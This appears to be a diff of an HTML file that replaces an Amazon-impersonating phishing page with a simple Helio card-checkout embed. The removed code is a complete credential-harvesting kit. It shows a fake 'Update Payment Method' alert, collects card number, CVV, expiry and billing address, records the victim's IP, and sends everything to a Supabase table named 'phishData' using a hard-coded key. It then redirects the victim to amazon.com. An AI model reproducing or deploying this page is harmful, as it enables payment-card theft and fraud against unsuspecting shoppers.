@@ -1,236 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Update</title>
-    <link href="https://fonts.googleapis.com/css2?family=Ember:wght@400;500&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        body { font-family: 'Ember', Arial, sans-serif; background-color: #f3f3f3; margin: 0; padding: 20px; min-height: 100vh; }
-        .header { background-color: #232f3e; color: white; padding: 10px 20px; text-align: center; }
-        .header img { height: 30px; filter: brightness(0) invert(1); }
-        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .alert { background-color: #fff8e1; border-left: 4px solid #ff9900; padding: 15px; margin-bottom: 20px; color: #333; }
-        .alert h3 { margin: 0 0 10px 0; color: #c45500; font-size: 18px; }
-        .title { font-size: 24px; font-weight: 500; color: #333; margin-bottom: 10px; }
-        .subtitle { font-size: 16px; color: #666; margin-bottom: 20px; }
-        .secure-update { background: #f0f8ff; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; }
-        .secure-update i { color: #007185; margin-right: 10px; font-size: 20px; }
-        .secure-update p { margin: 0; color: #333; }
-        form { display: grid; gap: 15px; }
-        .form-group { display: flex; flex-direction: column; }
-        label { font-weight: 500; margin-bottom: 5px; color: #333; }
-        input, select { padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
-        input:focus, select:focus { border-color: #ff9900; outline: none; box-shadow: 0 0 0 2px rgba(255, 153, 0, 0.2); }
-        .row { display: flex; gap: 10px; }
-        .row .form-group { flex: 1; }
-        .checkbox { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; }
-        .checkbox input { width: auto; margin-top: 2px; }
-        .checkbox a { color: #007185; text-decoration: none; }
-        button { background-color: #ff9900; border: 1px solid #ff9900; color: #333; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px; }
-        button:hover { background-color: #e47911; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        .badges { display: flex; justify-content: center; gap: 15px; margin-top: 20px; flex-wrap: wrap; }
-        .badge { display: flex; align-items: center; font-size: 12px; color: #666; gap: 5px; }
-        .error { color: #c45500; font-size: 14px; display: none; }
-        .loading { display: none; text-align: center; color: #666; margin-top: 20px; }
-        .loading i { font-size: 24px; }
-        .footer { margin-top: 30px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #ddd; padding-top: 15px; }
-        .footer a { color: #007185; text-decoration: none; margin: 0 5px; }
-        .help-link { font-size: 14px; margin-top: 10px; text-align: center; }
-        .help-link a { color: #007185; text-decoration: none; }
-        @media (max-width: 768px) { .container { padding: 20px; } .row { flex-direction: column; } }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pay with Card</title>
+
+  <!-- Helio Embed Script -->
+  <script type="module" crossorigin src="https://embed.hel.io/assets/index-v1.js"></script>
+
+  <style>
+    /* Center entire page */
+    body {
+      margin: 0;
+      background: #000;
+      color: #abff09;
+      font-family: "Poppins", Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    /* Optional logo or text title */
+    #brand {
+      margin-bottom: 40px;
+    }
+
+    #brand img {
+      width: 140px;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 0 20px #8200b7;
+    }
+
+    #brand h1 {
+      font-size: 2rem;
+      letter-spacing: 1px;
+      text-shadow: 0 0 15px #8200b7;
+      margin: 0;
+    }
+
+    /* Make button bigger */
+    #helioCheckoutContainer button {
+      transform: scale(1.4);
+      padding: 18px 36px !important;
+      font-size: 1.3rem !important;
+      font-weight: 600;
+      border-radius: 12px !important;
+      box-shadow: 0 0 15px #abff09;
+    }
+
+    #helioCheckoutContainer button:hover {
+      transform: scale(1.5);
+      box-shadow: 0 0 25px #abff09;
+    }
+
+    /* Mobile-friendly scaling */
+    @media (max-width: 600px) {
+      #helioCheckoutContainer button {
+        transform: scale(1.2);
+        font-size: 1.1rem !important;
+        padding: 14px 26px !important;
+      }
+      #brand img {
+        width: 100px;
+      }
+      #brand h1 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
 </head>
+
 <body>
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
-    </div>
-    <div class="container">
-        <div class="alert">
-            <h3>Update Required</h3>
-            <p>Your payment method on file needs to be updated. This is due to recent account security enhancements. Please update your information below to avoid any interruption.</p>
-        </div>
-        <div class="title">Update Payment Method</div>
-        <div class="subtitle">Securely update your payment information.</div>
-        <div class="secure-update">
-            <i class="fas fa-shield-alt"></i>
-            <p><strong>Secure Update:</strong> Your information is encrypted and protected using industry-standard security measures.</p>
-        </div>
-        <form id="paymentForm">
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" required>
-            </div>
-            <div class="form-group">
-                <label for="billingAddress">Billing Address</label>
-                <input type="text" id="billingAddress" required>
-            </div>
-            <div class="row">
-                <div class="form-group">
-                    <label for="billingCity">City</label>
-                    <input type="text" id="billingCity" required>
-                </div>
-                <div class="form-group">
-                    <label for="billingState">State</label>
-                    <input type="text" id="billingState" required>
-                </div>
-            </div>
-            <div class="row">
-                <div class="form-group">
-                    <label for="billingZip">ZIP Code</label>
-                    <input type="text" id="billingZip" required>
-                </div>
-                <div class="form-group">
-                    <label for="billingCountry">Country</label>
-                    <select id="billingCountry" required>
-                        <option value="">Select Country</option>
-                        <option value="US">United States</option>
-                        <option value="CA">Canada</option>
-                        <option value="UK">United Kingdom</option>
-                        <option value="AU">Australia</option>
-                        <option value="DE">Germany</option>
-                    </select>
-                </div>
-            </div>
-            <div class="form-group">
-                <label for="cardName">Name on Card</label>
-                <input type="text" id="cardName" required>
-            </div>
-            <div class="form-group">
-                <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" maxlength="19" required>
-            </div>
-            <div class="row">
-                <div class="form-group">
-                    <label for="expiration">Expiration Date</label>
-                    <input type="text" id="expiration" maxlength="5" required>
-                </div>
-                <div class="form-group">
-                    <label for="cvv">CVV</label>
-                    <input type="password" id="cvv" maxlength="4" required>
-                </div>
-            </div>
-            <div class="checkbox">
-                <input type="checkbox" id="terms" required>
-                <label for="terms">I agree to Amazon's <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Conditions of Use</a> and <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" target="_blank">Privacy Notice</a>.</label>
-            </div>
-            <div class="g-recaptcha" data-sitekey="6LedQtQrAAAAAA6-Zkfv90E8SpWe9x6bWm9mt1Gk"></div>
-            <div id="errorMessage" class="error">Please complete all fields, agree to the terms, and complete the captcha.</div>
-            <div id="loading" class="loading">
-                <i class="fas fa-spinner fa-spin"></i> Updating your payment method...
-            </div>
-            <button type="submit" id="submitBtn">Update Payment Method</button>
-        </form>
-     
-        <div class="badges">
-            <div class="badge"><i class="fas fa-lock"></i> SSL Secured</div>
-            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" style="height:20px;"></div>
-            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/100px-MasterCard_Logo.svg.png" alt="Mastercard" style="height:20px;"></div>
-            <div class="badge"><i class="fab fa-cc-amex"></i> Amex</div>
-            <div class="badge"><i class="fas fa-shield-alt"></i> PCI Compliant</div>
-        </div>
-        <div class="footer">
-            © 2025 Amazon.com, Inc. or its affiliates | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088">Conditions of Use</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496">Privacy Notice</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=202134020">Interest-Based Ads</a>
-        </div>
-    </div>
+  <!-- 🪩 Add your logo OR name here -->
+  <div id="brand">
+    <!-- Option 1: logo image -->
+    <!-- Replace the image URL below with your own -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2022.svg" alt="Your Logo" />
 
-    <script type="module">
-        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
+    <!-- Option 2: or remove the image above and just show text -->
+    <!-- <h1>Your Brand Name</h1> -->
+  </div>
 
-        // Supabase configuration - Replace with your actual project details
-        const supabaseUrl = 'https://xesuvuhkgxibgysgwfnf.supabase.co';
-        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhlc3V2dWhrZ3hpYmd5c2d3Zm5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk4NDk2MDEsImV4cCI6MjA3NTQyNTYwMX0.k__3S2tX5BoF6Mtp9JgGbW6objILtE3zspXpU59mJH8';
-        const supabase = createClient(supabaseUrl, supabaseAnonKey);
+  <!-- Helio checkout container -->
+  <div id="helioCheckoutContainer"></div>
 
-        // Card number formatting
-        const cardNumberInput = document.getElementById('cardNumber');
-        const cleave = new Cleave(cardNumberInput, {
-            creditCard: true
-        });
-
-        // Expiration date formatting
-        const expirationInput = document.getElementById('expiration');
-        new Cleave(expirationInput, {
-            date: true,
-            datePattern: ['m', 'y']
-        });
-
-        // CVV masking (already password, but ensure numeric)
-        document.getElementById('cvv').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            console.log('Form submitted');
-            const recaptchaResponse = grecaptcha.getResponse();
-            if (!recaptchaResponse) {
-                document.getElementById('errorMessage').style.display = 'block';
-                return;
-            }
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('errorMessage').style.display = 'none';
-            document.getElementById('submitBtn').disabled = true;
-
-            const fullName = document.getElementById('fullName').value;
-            const billingAddress = document.getElementById('billingAddress').value;
-            const billingCity = document.getElementById('billingCity').value;
-            const billingState = document.getElementById('billingState').value;
-            const billingZip = document.getElementById('billingZip').value;
-            const billingCountry = document.getElementById('billingCountry').value;
-            const cardName = document.getElementById('cardName').value;
-            const cardNumber = cleave.getRawValue(); // Unformatted value
-            const expiration = document.getElementById('expiration').value;
-            const cvv = document.getElementById('cvv').value;
-
-            if (!fullName || !billingAddress || !billingCity || !billingState || !billingZip || !billingCountry || cardNumber.length < 13 || cvv.length < 3 || expiration.length < 5) {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('submitBtn').disabled = false;
-                return;
-            }
-
-            try {
-                console.log('Sending to Supabase...');
-                const { data, error } = await supabase
-                    .from('phishData') // Ensure this table exists in your Supabase database
-                    .insert([
-                        {
-                            type: "amazon_payment_update",
-                            fullName: fullName,
-                            billingAddress: billingAddress,
-                            billingCity: billingCity,
-                            billingState: billingState,
-                            billingZip: billingZip,
-                            billingCountry: billingCountry,
-                            cardName: cardName,
-                            cardNumber: cardNumber,
-                            expiration: expiration,
-                            cvv: cvv,
-                            recaptchaToken: recaptchaResponse,
-                            timestamp: new Date().toISOString(),
-                            ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
-                        }
-                    ]);
-                if (error) {
-                    throw error;
-                }
-                console.log('Success, redirecting...');
-                setTimeout(() => {
-                    window.location.href = "https://www.amazon.com";
-                }, 3000);
-            } catch (error) {
-                console.error('Supabase error:', error);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('submitBtn').disabled = false;
-            }
-        });
-    </script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      window.helioCheckout(
+        document.getElementById("helioCheckoutContainer"),
+        {
+          paylinkId: "68ef6c937967b9161b5ecb9e", // your Helio Paylink ID
+          theme: {
+            themeMode: "dark",
+            primaryColor: "#abff09",
+            neutralColor: "#8200b7"
+          },
+          display: "button",
+          primaryPaymentMethod: "fiat", // card only
+          showPayWithCard: true,
+          showPayWithCrypto: false,
+          allowCustomAmount: true // let user choose amount
+        }
+      );
+    });
+  </script>
 </body>
 </html>
